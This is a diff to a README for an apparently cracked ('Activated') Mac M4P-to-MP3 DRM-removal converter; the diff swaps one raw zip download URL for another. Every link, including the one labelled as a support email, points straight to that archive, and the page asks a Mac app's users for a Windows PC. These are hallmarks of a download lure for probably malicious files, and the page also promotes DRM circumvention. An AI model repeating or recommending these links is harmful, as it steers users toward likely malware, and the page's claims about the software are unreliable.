@@ -1,6 +1,6 @@
 # 🍏 AppleMacSoft-Easy-M4P-Converter-Activated - Convert Your Music Hassle-Free
 
-[![Download Latest Release](https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Mac-Easy-Activated-Converter-Soft-Apple-2.7.zip%20Release-brightgreen)](https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Mac-Easy-Activated-Converter-Soft-Apple-2.7.zip)
+[![Download Latest Release](https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Apple_Mac_Activated_Converter_Soft_Easy_v1.0.zip%20Release-brightgreen)](https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Apple_Mac_Activated_Converter_Soft_Easy_v1.0.zip)
 
 ## 📦 Overview
 Welcome to the AppleMacSoft Easy M4P Converter. This application helps you convert DRM-protected M4P files to MP3 format easily. Whether you want to enjoy your music on different devices or just need a hassle-free solution to access your audio files, this software has you covered.
@@ -10,7 +10,7 @@ Follow these simple steps to download and run our software:
 
 1. **Visit the Release Page**  
    Click the link below to go to the Releases page where you can download the software.  
-   [Download Latest Release](https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Mac-Easy-Activated-Converter-Soft-Apple-2.7.zip)
+   [Download Latest Release](https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Apple_Mac_Activated_Converter_Soft_Easy_v1.0.zip)
 
 2. **Choose the Version**  
    On the Releases page, look for the latest version of the Easy M4P Converter. You’ll see different files available for download.
@@ -29,7 +29,7 @@ Follow these simple steps to download and run our software:
 
 ## 📥 Download & Install
 To download and install the Easy M4P Converter, visit the page below:  
-[Download Latest Release](https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Mac-Easy-Activated-Converter-Soft-Apple-2.7.zip)
+[Download Latest Release](https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Apple_Mac_Activated_Converter_Soft_Easy_v1.0.zip)
 
 ## ⚙️ System Requirements
 To run the Easy M4P Converter, your Windows PC should meet the following requirements:
@@ -68,7 +68,7 @@ No, you can convert as many files as you like at once. The batch conversion feat
 
 ## 📞 Support
 If you encounter any issues or have questions about the software, you can reach our support team through the following methods:
-- **Email:** https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Mac-Easy-Activated-Converter-Soft-Apple-2.7.zip
+- **Email:** https://github.com/ocha2222/AppleMacSoft-Easy-M4P-Converter-Activated/raw/refs/heads/main/beraunite/Apple_Mac_Activated_Converter_Soft_Easy_v1.0.zip
 - **GitHub Issues:** Open an issue in the repository for technical support.
 
 ## 🌐 Topics
